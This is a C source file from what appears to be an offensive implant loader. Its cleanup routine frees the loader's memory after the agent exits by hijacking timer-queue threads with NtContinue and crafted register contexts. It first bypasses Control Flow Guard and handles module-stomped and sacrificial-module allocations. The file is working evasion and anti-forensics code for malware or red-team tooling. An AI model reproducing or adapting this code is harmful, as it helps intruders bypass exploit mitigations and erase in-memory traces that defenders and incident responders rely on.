/*
 * cleanup — free loader memory regions after agent exit.
 *
 * Problem: you can't VirtualFree the memory your code is running from.
 * Solution: schedule timer callbacks that call VirtualFree after a delay,
 * then ExitThread before they fire. The timers run on a different thread
 * and free the (now-dead) memory safely.
 *
 * Uses NtContinue to set the timer thread's RIP to VirtualFree with
 * the right arguments pre-loaded in registers.
 */
#include <windows.h>
#include "memory.h"
#include "cfg.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateTimerQueue();
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateTimerQueueTimer(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
DECLSPEC_IMPORT void   WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT void   WINAPI KERNEL32$RtlCaptureContext(PCONTEXT);
DECLSPEC_IMPORT ULONG  NTAPI  NTDLL$NtContinue(CONTEXT *, BOOLEAN);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$FreeLibrary(HMODULE);

#define memcpy(d, s, n) __movsb((unsigned char *)(d), (unsigned char *)(s), (n))

void cleanup_memory(MEMORY_LAYOUT * memory)
{
    BOOL cfg_on = cfg_enabled();
    if (cfg_on) {
        if (bypass_cfg(NTDLL$NtContinue))
            cfg_on = FALSE;
    }
    if (cfg_on)
        return;

    CONTEXT ctx      = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;

    HANDLE timer_queue = KERNEL32$CreateTimerQueue();
    HANDLE timer       = NULL;

    if (!KERNEL32$CreateTimerQueueTimer(&timer, timer_queue,
            (WAITORTIMERCALLBACK)(KERNEL32$RtlCaptureContext),
            &ctx, 0, 0, WT_EXECUTEINTIMERTHREAD))
        return;

    KERNEL32$Sleep(100);

    if (ctx.Rip == 0)
        return;

    #define CTX_COUNT 3

    HANDLE    heap     = KERNEL32$GetProcessHeap();
    CONTEXT * ctx_free = (CONTEXT *) KERNEL32$HeapAlloc(
        heap, HEAP_ZERO_MEMORY, sizeof(CONTEXT) * CTX_COUNT);
    if (ctx_free == NULL)
        return;

    for (int i = 0; i < CTX_COUNT; i++)
        memcpy(&ctx_free[i], &ctx, sizeof(CONTEXT));

    /* free DLL image */
    ctx_free[0].Rsp -= sizeof(PVOID);
    if (memory->DllAllocMethod == ALLOC_MODULESTOMP && memory->SacModule != NULL) {
        ctx_free[0].Rip = (DWORD64)(KERNEL32$FreeLibrary);
        ctx_free[0].Rcx = (DWORD64)(memory->SacModule);
    } else {
        ctx_free[0].Rip = (DWORD64)(KERNEL32$VirtualFree);
        ctx_free[0].Rcx = (DWORD64)(memory->Dll.BaseAddress);
        ctx_free[0].Rdx = (DWORD64)(0);
        ctx_free[0].R8  = (DWORD64)(MEM_RELEASE);
    }

    /* schedule DLL free */
    KERNEL32$CreateTimerQueueTimer(&timer, timer_queue,
        (WAITORTIMERCALLBACK)(NTDLL$NtContinue), &ctx_free[0], 500, 0, WT_EXECUTEINTIMERTHREAD);

    /* PICO lives in its own image-backed sacrificial module. */
    if (memory->Pico.Module != NULL) {
        ctx_free[1].Rsp -= sizeof(PVOID);
        ctx_free[1].Rip = (DWORD64)(KERNEL32$FreeLibrary);
        ctx_free[1].Rcx = (DWORD64)(memory->Pico.Module);

        KERNEL32$CreateTimerQueueTimer(&timer, timer_queue,
            (WAITORTIMERCALLBACK)(NTDLL$NtContinue), &ctx_free[1], 500, 0, WT_EXECUTEINTIMERTHREAD);
    } else {
        ctx_free[1].Rsp -= sizeof(PVOID);
        ctx_free[1].Rip = (DWORD64)(KERNEL32$VirtualFree);
        ctx_free[1].Rcx = (DWORD64)(memory->Pico.Code);
        ctx_free[1].Rdx = (DWORD64)(0);
        ctx_free[1].R8  = (DWORD64)(MEM_RELEASE);

        ctx_free[2].Rsp -= sizeof(PVOID);
        ctx_free[2].Rip = (DWORD64)(KERNEL32$VirtualFree);
        ctx_free[2].Rcx = (DWORD64)(memory->Pico.Data);
        ctx_free[2].Rdx = (DWORD64)(0);
        ctx_free[2].R8  = (DWORD64)(MEM_RELEASE);

        KERNEL32$CreateTimerQueueTimer(&timer, timer_queue,
            (WAITORTIMERCALLBACK)(NTDLL$NtContinue), &ctx_free[1], 500, 0, WT_EXECUTEINTIMERTHREAD);
        KERNEL32$CreateTimerQueueTimer(&timer, timer_queue,
            (WAITORTIMERCALLBACK)(NTDLL$NtContinue), &ctx_free[2], 500, 0, WT_EXECUTEINTIMERTHREAD);
    }
}
